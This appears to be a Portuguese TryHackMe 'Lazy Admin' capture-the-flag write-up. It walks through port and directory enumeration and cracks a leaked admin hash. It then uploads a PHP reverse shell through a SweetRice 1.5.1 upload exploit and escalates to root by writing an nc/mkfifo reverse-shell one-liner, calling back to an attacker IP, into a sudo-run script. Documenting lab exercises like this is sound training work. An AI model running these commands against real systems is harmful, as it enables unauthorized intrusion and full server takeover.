<h1><b>Segue Writeup da maquina Lazy Admin Final do Try Hack Me</h1>

<br><br>
<b>Enumeração das portas com o NMAP 
  
```
┌──(xnv㉿kali)-[~]
└─$ nmap -A 10.10.49.240

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 04:08 EDT
Nmap scan report for lazyadmin.com (10.10.240.121)
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.82 seconds
```

<b>Eumeração de arquivos e pastas com o WFUZZ
  
```
┌──(xnv㉿kali)-[~]
└─$ wfuzz -c -w /usr/share/dirb/wordlists/common.txt --hc 404,403 -u http://10.10.49.240/FUZZ -t 100

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000001:   200        375 L    968 W      11321 Ch    "http://10.10.49.240/"
000001027:   301        9 L      28 W       314 Ch      "content"
000002020:   200        375 L    968 W      11321 Ch    "index.html"
```
<b>Após encontrar a pasta "content", fiz uma nova enumeração das pastas colocando o content
  
```
┌──(xnv㉿kali)-[~]
└─$ wfuzz -c -w /usr/share/dirb/wordlists/common.txt --hc 404,403 -u http://10.10.49.240/content/FUZZ -t 100
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000001:   200        35 L     151 W      2198 Ch     "http://10.10.49.240/content/"
000000478:   301        9 L      28 W       317 Ch      "as"
000000505:   301        9 L      28 W       325 Ch      "attachment"
000000089:   301        9 L      28 W       322 Ch      "_themes"
000001991:   301        9 L      28 W       321 Ch      "images"
000002010:   301        9 L      28 W       318 Ch      "inc"
000002021:   200        35 L     151 W      2198 Ch     "index.php"
000002179:   301        9 L      28 W       317 Ch      "js"
```
<b>Depois de verificar as pastas e arquivos listados, encontrei um arquivo .sql 
  
![Capturar](https://user-images.githubusercontent.com/90646635/133702386-4aca21e1-f88d-4a3b-b77b-eceedbc6dd0b.PNG)

<b>Nesse arquivo .sql você irá encontrar um usuário e senha para logar na aplicação.
  
```
"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"
```

<b>Para quebrar esse hash usei o "https://crackstation.net/", com o usuário e senha é só acessar a aplicação no url.
  
![2](https://user-images.githubusercontent.com/90646635/133703615-493a9493-20bf-421b-9af9-090b59e23e94.PNG)

  
<b>Logado vi que se tratava de uma aplicação chamada SweetRice com a versão 1.5.1, com essas informações fui caçar no "https://www.exploit-db.com/"
  
![3](https://user-images.githubusercontent.com/90646635/133704110-9ba96cc1-a21c-47aa-99b5-0d4be571cb21.PNG)

<b>O exploit vai fazer upload de um arquivo para o servidor, então coloquei uma Web Shell, mas o exploit pede algumas extensões especificas escolhi a .php5
  
```
┌──(xnv㉿kali)-[~/thm/lazyadminfinal]
└─$ mv php-reverse-shell.php php-reverse-shell.php5
```
<b>Então Vamos executar o Exploit, ele irá pedir as seguintes informações, URL , USERNAME , PASSWORD , FILE
  
```
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |                                                    
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

Enter The Target URL(Example : localhost.com) : 10.10.49.240/content
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : php-reverse-shell.php
[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.10.49.240/content/attachment/php-reverse-shell.php5
```
  
Colocamos o netcat para ficar aguardando a Web Shell   
```
┌──(xnv㉿kali)-[~/thm/lazyadminfinal]
└─$ nc -lnvp 4455 
```
  
<b>Com a Web Shell no servidor e o netcat aguarando uma resposta, é só dar um Curl nela que será executada.
  
```
┌──(xnv㉿kali)-[~/thm/lazyadminfinal]
└─$ curl http://10.10.49.240/content/attachment/php-reverse-shell.php5
```
<b>E então temos uma Shell no servidor
  
![4](https://user-images.githubusercontent.com/90646635/133705881-0f406078-6a64-473a-a52a-52275830e835.PNG)
  
<b>E então pegamos a flag User 
  
```  
www-data@THM-Chal:/home/itguy$ cat user.txt
THM{********************************}
```
  
<b> Para encontrar a flag Root, damos um 
  
```
www-data@THM-Chal:/home/itguy$ sudo -l

Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
<b> No arquivo backup.pl, mostra que ele executa um arquivo que está em /etc/
  
![5](https://user-images.githubusercontent.com/90646635/133706646-9251298c-0345-4556-abf0-b5c7411e4658.PNG)

<b> Então coloquei um reverse shell lá dentro já que eu tinha permissão para isso.

```
www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.21 4445 >/tmp/f" > /etc/copy.sh
```
  
<b> Liguei outro netcat ouvindo a porta 4445
 
``` 
┌──(xnv㉿kali)-[~]
└─$ nc -lnvp 4445
```
  
<b>E executei o arquivo backup
  
```
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
```
<b> E assim temos o usuario root, é só ler o arquivo root.txt
  
```
# cat /root/root.txt
THM{********************************}  
```
